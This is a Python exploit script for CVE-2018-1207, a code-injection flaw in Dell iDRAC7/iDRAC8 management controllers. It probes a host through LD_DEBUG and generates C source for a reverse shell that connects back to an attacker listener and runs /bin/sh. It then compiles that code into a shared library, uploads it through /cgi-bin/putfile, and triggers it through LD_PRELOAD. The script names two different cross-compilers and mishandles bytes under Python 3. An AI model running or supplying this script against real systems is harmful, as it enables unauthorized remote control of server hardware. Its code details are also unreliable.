#!/usr/bin/env python3

# Exploit Title: Dell iDRAC7 and iDRAC8 Devices Code Injection Vulnerability (RCE)
# Vulnerable version firmware: <  2.52.52.52
# Date: 2018-09-06
# Vendor Homepage: https://www.dell.com
# CVE number: CVE-2018-1207
# By: Starev Alexey ( https://t.me/starev_aa ), http://kraud.ru, Chapman Schleiss (migrating to Python3)

import requests
import sys
import os
import re
import struct
import urllib3
import logging
import argparse

parser = argparse.ArgumentParser(description="This script will scan for vulnerable hosts and, alternatively, exploit the vulnerable endpoint.")
parser.add_argument('--rhost', action='store', dest='rhost', required=True, help='Remote host to attack (hostname or IP)')
parser.add_argument('--rport', action='store', dest='rport', required=True, help='Remote host port to attack')
parser.add_argument('--lhost', action='store', dest='lhost', help='Listener host (IP only)')
parser.add_argument('--lport', action='store', dest='lport', help='Listener port')
parser.add_argument('-v','--verbose', action='store_true', dest='verbose', help='Increase logging')

args = parser.parse_args()
payloadbin = 'payload.so'
payloadc = 'payload.c'
timeout = 10
url = "https://{}:{}".format(args.rhost, args.rport)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if args.verbose:
  logging.basicConfig(level=logging.DEBUG, format='[%(asctime)s] [%(levelname)s] %(message)s')
else:
  logging.basicConfig(level=logging.INFO, format='[%(asctime)s] [%(levelname)s] %(message)s')

logging.info("Scanning {}".format(url))
try:
  r = requests.get(url+'/cgi-bin/login?LD_DEBUG=files', verify=False, timeout=timeout)
except:
  logging.debug("Could not connect to server")
  quit()

vul  = re.search(r'calling init: /lib/',r.text)
if vul:
  logging.warning("{} is vulnerable!".format(url))
else:
  logging.info("{} is not vulnerable...".format(url))
  quit()

if args.lhost and args.lport:
  logging.info("Generating payload")
  if os.path.exists(payloadc):
    os.unlink(payloadc)

  payload = ("""
  #include <stdlib.h>
  #include <unistd.h>
  #include <sys/socket.h>
  #include <netinet/in.h>
  #include <arpa/inet.h>
  #include <unistd.h>
  static void main(void) __attribute__((constructor));
  static void main(void)
  {
         int pid = fork();
         if(!pid) {
                  int sock = socket(AF_INET, SOCK_STREAM, 0);
                  struct sockaddr_in serv_addr = {0};
                  serv_addr.sin_family = AF_INET;
                  serv_addr.sin_port = htons(%d);
                  serv_addr.sin_addr.s_addr = inet_addr("%s");
                  connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
                  dup2(sock, 0);
                  dup2(sock, 1);
                  dup2(sock, 2);
                  execl("/bin/sh", "/bin/sh", NULL);
          }
  }
  """) % (int(args.lport), args.lhost)

  with open(payloadc, 'w') as file:
    file.write(payload)

  if os.path.exists(payloadc):
    cmd = os.system('sh4-linux-gnu-gcc-10 -shared -fPIC ./payload.c -o ./payload.so')
    exit_code = os.WEXITSTATUS(cmd)
    if exit_code == 0:
      logging.info("Generated payload successfully")
    else:
      logging.error("Error generating payload. You need to install gcc-9-s390x-linux-gnu (apt install gcc-9-s390x-linux-gnu).")
      quit()
  else:
    logging.error("Error generating payload. Please check the permissions and owner of your directory")
    quit()

  FFLAGS = 1
  f = open(payloadbin, "rb")
  payload_so = f.read()
  f.close()

  res = ''
  f_alias = 'RACPKSSHAUTHKEY1'
  res += f_alias + (32 - len(f_alias))*'\0'
  res += str(struct.pack('<L', len(payload_so)))
  res += str(struct.pack('<L', FFLAGS))
  res += str(payload_so)

  logging.info("Uploading payload")
  try:
    r = requests.post(url+'/cgi-bin/putfile', data=res, verify=False, timeout=timeout)
  except:
    logging.error("Could not upload payload")
    logging.error(r.text)
    quit()

  if r.status_code == 200:
    logging.info("Payload uploaded")
  else:
    logging.error("Failed to upload payload")
    logging.error(r.text)
    quit()

  if os.path.exists(payloadc):
    os.unlink(payloadc)
  if os.path.exists(payloadbin):
    os.unlink(payloadbin)

  logging.info("Starting shell")
  try:
    r = requests.get(url+'/cgi-bin/discover?LD_PRELOAD=/tmp/sshpkauthupload.tmp', verify=False, timeout=timeout)
  except:
    logging.error("Could not upload payload")
    logging.error(r.text)

  if r.status_code == 200:
    logging.info("Shell started successfully")
  else:
      logging.error("Failed to start shell")
      logging.error(r.text)
